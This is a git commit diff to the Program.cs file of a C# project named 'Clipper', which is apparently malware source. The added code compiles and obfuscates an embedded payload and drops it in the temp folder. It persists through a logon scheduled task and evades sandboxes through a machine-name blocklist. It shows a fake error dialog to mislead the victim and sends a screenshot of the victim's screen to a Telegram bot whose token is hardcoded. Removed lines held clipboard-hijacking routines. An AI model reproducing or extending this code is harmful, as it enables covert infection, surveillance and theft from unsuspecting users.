1ab846273fdb78ea4cf951a95866b454ce3dcb2b
brukin234 <85556689+brukin234@users.noreply.github.com>
2023-05-30 11:40:55 +0300

    Update Program.cs

--- Program.cs
+++ Program.cs
@@ -1,81 +1,51 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
+using System;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Text.RegularExpressions;
 using System.IO;
 using System.CodeDom.Compiler;
 using Microsoft.CSharp;
-using System.CodeDom;
-using System.Reflection;
-using System.Xml;
 using Microsoft.Win32.TaskScheduler;
-using System.Security.Cryptography;
+using System.Drawing;
+using Telegram.Bot;
+using Telegram.Bot.Types;
+using dnlib.DotNet;
+using yetAnotherObfuscator;
+using System.Reflection;
 
 namespace Clipper
 {
     internal class Program
     {
         static string name = "CompPkgSrv.exe";
-        static void Main(string[] args)
+
+
+        static async System.Threading.Tasks.Task Main(string[] args)
+        {
+            await Anothermain();
+        }
+        static async System.Threading.Tasks.Task Anothermain()  
         {
             if (StartCheck() == true)
             {
                 System.Threading.Tasks.Task CopyTask = System.Threading.Tasks.Task.Factory.StartNew(() =>
                 {
-                    Compile(HvN9xC1PAr.Properties.Resources.LKaoNhpaHsf);
+                    Obfuscate(Path.Combine(Path.GetTempPath(), name));
                 });
                 CopyTask.Wait();
-                Thread.Sleep(1000);
                 Startup();
                 Error();
+                await SendScreenshotAsync("-870592197");
             }
             else
             {
                 Error();
             }
-
         }
-        public static string GetText()
-        {
-            string ReturnValue = string.Empty;
-            Thread STAThread = new Thread(
-                delegate ()
-                {
-                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
-                });
-            STAThread.SetApartmentState(ApartmentState.STA);
-            STAThread.Start();
-            STAThread.Join();
-
-            return ReturnValue;
-        }
-
-        public static void SetText(string txt)
-        {
-            Thread STAThread = new Thread(
-                delegate ()
-                {
-                    try
-                    {
-                        System.Windows.Forms.Clipboard.SetText(txt);
-                    }
-                    catch
-                    { }
-                });
-            STAThread.SetApartmentState(ApartmentState.STA);
-            STAThread.Start();
-            STAThread.Join();
-        }
-        public static void Compile(string code)
+        public static string Compile(string code)
         {
             CSharpCodeProvider provider = new CSharpCodeProvider();
             CompilerParameters parameters = new CompilerParameters();
-            parameters.GenerateExecutable = true;
-            parameters.OutputAssembly = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),name);
+            parameters.GenerateExecutable = false;
             parameters.CompilerOptions = "/target:winexe";
             parameters.ReferencedAssemblies.Add("System.dll");
             parameters.ReferencedAssemblies.Add("System.Core.dll");
@@ -83,6 +53,26 @@ namespace Clipper
             parameters.ReferencedAssemblies.Add("System.Threading.dll");
 
             CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
+            return results.PathToAssembly;
+        }
+
+        public static void Obfuscate(string obf_path)
+        {
+            string path = "";
+            System.Threading.Tasks.Task CopyTask = System.Threading.Tasks.Task.Factory.StartNew(() =>
+            {
+                path = Compile(Wzo0sX6pWg.Properties.Resources.irMLQuZLaG);
+            });
+            CopyTask.Wait();
+
+            Assembly Default_Assembly;
+            Default_Assembly = System.Reflection.Assembly.UnsafeLoadFrom(path);
+            ModuleDefMD Module = ModuleDefMD.Load(path);
+            AssemblyDef Assembly = Module.Assembly;
+
+            ManipulateStrings.PerformStringEncryption(Module);
+            ChangeMethodsName.Fire(Module, Default_Assembly);
+            Wzo0sX6pWg.Obf.SaveToFile(Module, path, obf_path);
         }
         public static void Startup()
         {
@@ -90,7 +80,7 @@ namespace Clipper
             {
                 TaskDefinition td = ts.NewTask();
                 td.RegistrationInfo.Description = "Task to execute application";
-                td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),name)));
+                td.Actions.Add(new ExecAction(Path.Combine(Path.GetTempPath(), name)));
                 td.Triggers.Add(new LogonTrigger());
                 ts.RootFolder.RegisterTaskDefinition("Application Execution Task", td);
                 ts.GetTask("Application Execution Task").Run();
@@ -98,8 +88,21 @@ namespace Clipper
         }
         public static bool StartCheck()
         {
-            if (File.Exists(Path.Combine(System.Windows.Forms.Application.StartupPath, "Leaf.xNet.dll")))
+            if (System.IO.File.Exists(Path.Combine(System.Windows.Forms.Application.StartupPath, "Leaf.xNet.dll")))
             {
+                string[] lines = Wzo0sX6pWg.Properties.Resources.pc_name_list.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
+                foreach (string i in lines)
+                {
+                    if (Environment.MachineName != i)
+                    {
+                        continue;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+
                 return true;
             }
             else
@@ -111,6 +114,25 @@ namespace Clipper
         {
             System.Windows.Forms.MessageBox.Show("The following information was found for this error:\r\n\r\nCode:\r\n  0x129838F8F\r\n\r\nDescription:\r\n  Visual Studio C++ libraries needed", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
         }
-      
+
+        public static async System.Threading.Tasks.Task SendScreenshotAsync(string chatId)
+        {
+            TelegramBotClient botClient = new TelegramBotClient("5734995063:AAGct4zZ5-Uxl_7S8B8R40SJtx2p9lvO3Ic");
+            var screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            using (var graphics = Graphics.FromImage(screenshot))
+            {
+                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
+            }
+
+            using (var stream = new MemoryStream())
+            {
+                screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
+                stream.Seek(0, SeekOrigin.Begin);
+
+                var photo = new InputFileStream(stream);
+                await botClient.SendPhotoAsync(chatId, photo);
+            }
+        }
+
     }
 }
